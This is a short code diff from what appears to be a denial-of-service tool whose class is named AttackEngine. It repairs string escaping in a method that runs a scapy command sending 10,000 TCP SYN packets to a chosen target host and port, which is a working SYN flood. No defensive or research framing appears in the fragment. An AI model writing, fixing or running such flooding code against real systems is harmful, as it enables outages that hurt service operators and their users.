@@ -867,8 +867,9 @@ class AttackEngine(threading.Thread):
             log("[ENGINE] L4 error: {}".format(e))
 
     def _run_syn(self, end_time):
-        self._run_external('python3 -c "from scapy.all import *; send(IP(dst='{}')/TCP(dport={}, flags='S'), count=10000, inter=0.001, verbose=0)"'.format(
-            self.target, self.port))
+        cmd = 'python3 -c "from scapy.all import *; send(IP(dst=\'{}\')/TCP(dport={}, flags=\'S\'), count=10000, inter=0.001, verbose=0)"'.format(
+            self.target, self.port)
+        self._run_external(cmd)
 
     def _run_external(self, cmd):
         try:
